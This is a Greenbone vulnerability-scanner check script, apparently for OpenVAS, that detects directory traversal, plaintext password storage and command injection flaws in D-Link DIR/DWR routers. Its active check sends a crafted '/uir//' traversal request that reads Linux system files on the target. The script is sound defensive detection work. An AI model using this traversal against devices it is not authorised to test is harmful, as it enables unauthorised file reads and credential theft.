# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE_PREFIX = "cpe:/o:dlink";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108487");
  script_version("2025-07-02T05:41:52+0000");
  script_tag(name:"last_modification", value:"2025-07-02 05:41:52 +0000 (Wed, 02 Jul 2025)");
  script_tag(name:"creation_date", value:"2018-11-26 13:53:11 +0100 (Mon, 26 Nov 2018)");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2023-11-08 22:47:00 +0000 (Wed, 08 Nov 2023)");

  script_cve_id("CVE-2018-10822", "CVE-2018-10823", "CVE-2018-10824");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("D-Link DIR/DWR Devices Multiple Vulnerabilities (Oct 2018) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  # nb: Experiences in the past have shown that various different devices might be affected
  script_dependencies("gb_dlink_dsl_consolidation.nasl", "gb_dlink_dap_consolidation.nasl",
                      "gb_dlink_dir_consolidation.nasl", "gb_dlink_dwr_consolidation.nasl");
  script_mandatory_keys("d-link/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"D-Link DIR / DWR devices are prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check whether it is possible
  to read a file on the filesystem.");

  script_tag(name:"insight", value:"Multiple flaws exist due to:

  - CVE-2018-10822: Directory traversal vulnerability in the web interface caused by an incorrect
  fix for CVE-2017-6190.

  - CVE-2018-10824: The administrative password is stored in plaintext in the /tmp/XXX/0 file.

  - CVE-2018-10823: It is possible to inject code shell commands as an authenticated user into the
  Sip parameter of the chkisg.htm page.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote attacker to read
  arbitrary files on the target system, extract plain text passwords or execute remote commands.");

  script_tag(name:"affected", value:"DWR-116 through 1.06,

  DIR-140L and DIR-640L through 1.02,

  DWR-512, DWR-712, DWR-912 and DWR-921 through 2.02,

  DWR-111 through 1.01.

  Other devices, models or versions might be also affected.");

  script_tag(name:"solution", value:"See the vendor advisory for a solution.");

  script_xref(name:"URL", value:"https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10093");
  script_xref(name:"URL", value:"http://sploit.tech/2018/10/12/D-Link.html");
  script_xref(name:"URL", value:"https://seclists.org/fulldisclosure/2018/Oct/36");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("traversal_func.inc");

if( ! infos = get_app_port_from_cpe_prefix( cpe:CPE_PREFIX, service:"www" ) )
  exit( 0 );

port = infos["port"];
CPE  = infos["cpe"];

files = traversal_files( "linux" );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

foreach pattern( keys( files ) ) {

  file = files[pattern];
  url  = dir + "/uir//" + file;

  if( http_vuln_check( port:port, url:url, pattern:pattern, check_header:TRUE ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
